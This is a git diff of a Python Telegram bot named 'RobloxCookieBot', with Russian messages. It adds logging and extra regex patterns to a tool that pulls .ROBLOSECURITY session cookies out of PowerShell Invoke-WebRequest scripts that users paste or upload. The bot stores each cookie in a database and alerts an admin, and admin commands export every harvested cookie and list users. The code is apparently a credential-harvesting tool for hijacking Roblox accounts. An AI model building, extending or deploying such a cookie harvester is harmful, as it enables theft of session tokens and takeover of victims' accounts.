@@ -1,6 +1,8 @@
 import re
 import logging
 import asyncio
+import sys
+import traceback
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -14,18 +16,44 @@ from database import Database
 # Настройка логирования
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
+    level=logging.INFO,
+    stream=sys.stdout  # Важно для Render!
 )
 logger = logging.getLogger(__name__)
 
 class RobloxCookieBot:
     def __init__(self):
-        self.config = Config()
-        self.db = Database(self.config.DB_PATH)
-        self.app = Application.builder().token(self.config.BOT_TOKEN).build()
+        logger.info("=" * 50)
+        logger.info("🤖 СОЗДАНИЕ ЭКЗЕМПЛЯРА БОТА")
+        logger.info("=" * 50)
+        
+        try:
+            self.config = Config()
+            logger.info(f"✅ Config загружен")
+            logger.info(f"   Токен: {self.config.BOT_TOKEN[:10]}...")
+            logger.info(f"   Админ ID: {self.config.ADMIN_ID}")
+            logger.info(f"   Длина токена: {len(self.config.BOT_TOKEN)}")
+        except Exception as e:
+            logger.error(f"❌ Ошибка загрузки Config: {e}")
+            raise
+        
+        try:
+            self.db = Database(self.config.DB_PATH)
+            logger.info(f"✅ База данных инициализирована")
+        except Exception as e:
+            logger.error(f"❌ Ошибка базы данных: {e}")
+            raise
+        
+        try:
+            self.app = Application.builder().token(self.config.BOT_TOKEN).build()
+            logger.info("✅ Application создан")
+        except Exception as e:
+            logger.error(f"❌ Ошибка создания Application: {e}")
+            raise
         
         # Регистрация обработчиков
         self.setup_handlers()
+        logger.info("✅ Обработчики зарегистрированы")
     
     def setup_handlers(self):
         # Команды
@@ -57,7 +85,7 @@ class RobloxCookieBot:
     
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
-        chat = update.effective_chat
+        logger.info(f"👤 Команда /start от {user.id} (@{user.username})")
         
         # Добавляем пользователя в базу
         self.db.add_user(
@@ -81,6 +109,7 @@ class RobloxCookieBot:
             )
     
     async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        logger.info(f"🆘 Команда /help от {update.effective_user.id}")
         await update.message.reply_text(
             "Просто отправьте мне PowerShell скрипт с куки Roblox.\n"
             "Я автоматически извлеку .ROBLOSECURITY куки и сохраню их.",
@@ -91,26 +120,30 @@ class RobloxCookieBot:
         """
         Извлекает .ROBLOSECURITY куки из PowerShell скрипта
         """
+        logger.info(f"🔍 Извлечение куки из текста ({len(text)} символов)")
+        
         # Паттерн для поиска .ROBLOSECURITY куки
-        pattern = r'\.ROBLOSECURITY["\']?\s*,\s*["\']([^"\']+)["\']'
+        patterns = [
+            r'\.ROBLOSECURITY["\']?\s*,\s*["\']([^"\']+)["\']',
+            r'\.ROBLOSECURITY["\']?\s*,\s*["\'](.*?_\|WARNING:.*?)\s*["\']',
+            r'\.ROBLOSECURITY.*?["\'](.*?_\|WARNING:.*?)["\']',
+            r'["\']\.ROBLOSECURITY["\'].*?["\'](.*?)["\']'
+        ]
         
-        # Ищем совпадения
-        matches = re.search(pattern, text)
-        if matches:
-            return matches.group(1)
+        for i, pattern in enumerate(patterns):
+            matches = re.search(pattern, text, re.DOTALL)
+            if matches:
+                cookie = matches.group(1).strip()
+                logger.info(f"✅ Куки найден (паттерн {i+1}), длина: {len(cookie)}")
+                return cookie
         
-        # Альтернативный паттерн
-        pattern2 = r'\.ROBLOSECURITY["\']?\s*,\s*["\'](.*?_\|WARNING:.*?)\s*["\']'
-        matches2 = re.search(pattern2, text, re.DOTALL)
-        if matches2:
-            return matches2.group(1)
-        
-        # Если не нашли, возвращаем пустую строку
+        logger.warning("❌ Куки не найден в тексте")
         return ""
     
     async def handle_text_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         text = update.message.text
+        logger.info(f"📩 Сообщение от {user.id} ({len(text)} символов)")
         
         # Обновляем активность пользователя
         self.db.update_user_activity(user.id)
@@ -121,6 +154,7 @@ class RobloxCookieBot:
         if cookie:
             # Сохраняем куки в базу
             self.db.save_cookie(user.id, cookie)
+            logger.info(f"💾 Куки сохранен в БД для пользователя {user.id}")
             
             # Отправляем подтверждение
             await update.message.reply_text(
@@ -141,18 +175,21 @@ class RobloxCookieBot:
                              f"📏 Длина: {len(cookie)} символов\n"
                              f"🕒 Время: {datetime.now().strftime('%H:%M:%S')}"
                     )
+                    logger.info(f"📨 Уведомление отправлено админу {self.config.ADMIN_ID}")
                 except Exception as e:
-                    logger.error(f"Не удалось уведомить админа: {e}")
+                    logger.error(f"❌ Не удалось уведомить админа: {e}")
         else:
             await update.message.reply_text(
-                "❌ *Не удалось найти игру в тексте*\n\n"
-                "Убедитесь, что вы отправили полный PowerShell скрипт с игрой Invoke-WebRequest.",
+                "❌ *Не удалось найти .ROBLOSECURITY куки в тексте.*\n\n"
+                "Убедитесь, что вы отправили полный PowerShell скрипт с командой Invoke-WebRequest.",
                 parse_mode='Markdown'
             )
     
     async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Обработка документов (если пользователь отправляет файл)"""
         document = update.message.document
+        user = update.effective_user
+        logger.info(f"📎 Документ от {user.id}: {document.file_name}")
         
         if document.file_name and (document.file_name.endswith('.txt') or document.file_name.endswith('.ps1')):
             # Скачиваем файл
@@ -164,8 +201,8 @@ class RobloxCookieBot:
             cookie = self.extract_roblox_cookie(text)
             
             if cookie:
-                user = update.effective_user
                 self.db.save_cookie(user.id, cookie)
+                logger.info(f"💾 Куки из файла сохранен для {user.id}")
                 
                 await update.message.reply_text(
                     self.config.COOKIE_EXTRACTED.format(
@@ -187,6 +224,8 @@ class RobloxCookieBot:
     async def my_cookies_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Показать куки пользователя"""
         user = update.effective_user
+        logger.info(f"📁 Команда /mycookies от {user.id}")
+        
         cookies = self.db.get_user_cookies(user.id)
         
         if not cookies:
@@ -198,7 +237,7 @@ class RobloxCookieBot:
         
         message = f"📁 *Ваши куки ({len(cookies)}):*\n\n"
         
-        for i, cookie_data in enumerate(cookies[:5], 1):  # Показываем только первые 5
+        for i, cookie_data in enumerate(cookies[:5], 1):
             cookie_preview = cookie_data['cookie'][:50] + "..." if len(cookie_data['cookie']) > 50 else cookie_data['cookie']
             message += f"{i}. `{cookie_preview}`\n"
             message += f"   ⏰ {cookie_data['time']}\n\n"
@@ -212,7 +251,10 @@ class RobloxCookieBot:
     
     async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Статистика бота"""
-        if update.effective_user.id != self.config.ADMIN_ID:
+        user = update.effective_user
+        logger.info(f"📊 Команда /stats от {user.id}")
+        
+        if user.id != self.config.ADMIN_ID:
             await update.message.reply_text("❌ У вас нет прав доступа.")
             return
         
@@ -230,7 +272,10 @@ class RobloxCookieBot:
     
     async def users_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Список пользователей"""
-        if update.effective_user.id != self.config.ADMIN_ID:
+        user = update.effective_user
+        logger.info(f"👥 Команда /users от {user.id}")
+        
+        if user.id != self.config.ADMIN_ID:
             await update.message.reply_text("❌ У вас нет прав доступа.")
             return
         
@@ -242,14 +287,14 @@ class RobloxCookieBot:
         
         message = f"👥 *Список пользователей ({len(users)}):*\n\n"
         
-        for user in users[:20]:  # Ограничиваем вывод
+        for user_data in users[:20]:
             message += (
-                f"🆔 ID: `{user['user_id']}`\n"
-                f"👤 Имя: {user['first_name']}\n"
-                f"📛 Юзернейм: @{user['username'] or 'нет'}\n"
-                f"🍪 Куки: {user['cookie_count']}\n"
-                f"📅 Регистрация: {user['registered_at']}\n"
-                f"🕒 Активность: {user['last_activity']}\n"
+                f"🆔 ID: `{user_data['user_id']}`\n"
+                f"👤 Имя: {user_data['first_name']}\n"
+                f"📛 Юзернейм: @{user_data['username'] or 'нет'}\n"
+                f"🍪 Куки: {user_data['cookie_count']}\n"
+                f"📅 Регистрация: {user_data['registered_at']}\n"
+                f"🕒 Активность: {user_data['last_activity']}\n"
                 f"────────────────────\n"
             )
         
@@ -260,7 +305,10 @@ class RobloxCookieBot:
     
     async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Рассылка сообщений"""
-        if update.effective_user.id != self.config.ADMIN_ID:
+        user = update.effective_user
+        logger.info(f"📢 Команда /broadcast от {user.id}")
+        
+        if user.id != self.config.ADMIN_ID:
             await update.message.reply_text("❌ У вас нет прав доступа.")
             return
         
@@ -282,17 +330,17 @@ class RobloxCookieBot:
         success = 0
         failed = 0
         
-        for user in users:
+        for user_data in users:
             try:
                 await context.bot.send_message(
-                    chat_id=user['user_id'],
-                    text=f"📢 \n\n{message_text}",
+                    chat_id=user_data['user_id'],
+                    text=f"📢 *Сообщение от администратора:*\n\n{message_text}",
                     parse_mode='Markdown'
                 )
                 success += 1
-                await asyncio.sleep(0.1)  # Задержка между сообщениями
+                await asyncio.sleep(0.1)
             except Exception as e:
-                logger.error(f"Failed to send to {user['user_id']}: {e}")
+                logger.error(f"Не удалось отправить {user_data['user_id']}: {e}")
                 failed += 1
         
         await update.message.reply_text(
@@ -304,7 +352,10 @@ class RobloxCookieBot:
     
     async def delete_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Удалить пользователя"""
-        if update.effective_user.id != self.config.ADMIN_ID:
+        user = update.effective_user
+        logger.info(f"🗑️ Команда /delete от {user.id}")
+        
+        if user.id != self.config.ADMIN_ID:
             await update.message.reply_text("❌ У вас нет прав доступа.")
             return
         
@@ -321,11 +372,13 @@ class RobloxCookieBot:
             success = self.db.delete_user(user_id)
             
             if success:
+                logger.info(f"✅ Пользователь {user_id} удален")
                 await update.message.reply_text(
                     f"✅ Пользователь `{user_id}` удален.",
                     parse_mode='Markdown'
                 )
             else:
+                logger.warning(f"⚠️ Пользователь {user_id} не найден")
                 await update.message.reply_text(
                     f"❌ Пользователь `{user_id}` не найден.",
                     parse_mode='Markdown'
@@ -335,7 +388,10 @@ class RobloxCookieBot:
     
     async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Экспорт всех куки"""
-        if update.effective_user.id != self.config.ADMIN_ID:
+        user = update.effective_user
+        logger.info(f"📥 Команда /export от {user.id}")
+        
+        if user.id != self.config.ADMIN_ID:
             await update.message.reply_text("❌ У вас нет прав доступа.")
             return
         
@@ -369,20 +425,49 @@ class RobloxCookieBot:
                 filename=filename,
                 caption=f"📤 Экспортировано {len(cookies)} куки"
             )
+        
+        logger.info(f"✅ Экспортировано {len(cookies)} куки в файл {filename}")
     
     async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Обработка callback запросов"""
         query = update.callback_query
         await query.answer()
+        logger.info(f"🔘 Callback: {query.data}")
         await query.edit_message_text(text=f"Выбрано: {query.data}")
     
     def run(self):
         """Запуск бота"""
-        print("🤖 Бот запущен...")
-        print(f"Токен: {self.config.BOT_TOKEN[:10]}...")
-        print(f"Админ ID: {self.config.ADMIN_ID}")
-        self.app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
+        logger.info("=" * 50)
+        logger.info("🚀 ЗАПУСК БОТА TELEGRAM")
+        logger.info("=" * 50)
+        
+        logger.info(f"🤖 Токен: {self.config.BOT_TOKEN[:10]}...")
+        logger.info(f"👑 Админ ID: {self.config.ADMIN_ID}")
+        logger.info(f"📏 Длина токена: {len(self.config.BOT_TOKEN)}")
+        
+        try:
+            logger.info("🔄 Запускаем polling...")
+            self.app.run_polling(
+                allowed_updates=Update.ALL_TYPES,
+                drop_pending_updates=True,
+                close_loop=False
+            )
+        except KeyboardInterrupt:
+            logger.info("\n👋 Бот остановлен пользователем")
+        except Exception as e:
+            logger.error(f"❌ КРИТИЧЕСКАЯ ОШИБКА: {e}")
+            logger.error(traceback.format_exc())
+            raise
 
 if __name__ == '__main__':
-    bot = RobloxCookieBot()
-    bot.run()
+    logger.info("=" * 50)
+    logger.info("🤖 СКРИПТ БОТА ЗАПУЩЕН НАПРЯМУЮ")
+    logger.info("=" * 50)
+    
+    try:
+        bot = RobloxCookieBot()
+        bot.run()
+    except Exception as e:
+        logger.error(f"❌ ФАТАЛЬНАЯ ОШИБКА: {e}")
+        logger.error(traceback.format_exc())
+        sys.exit(1)
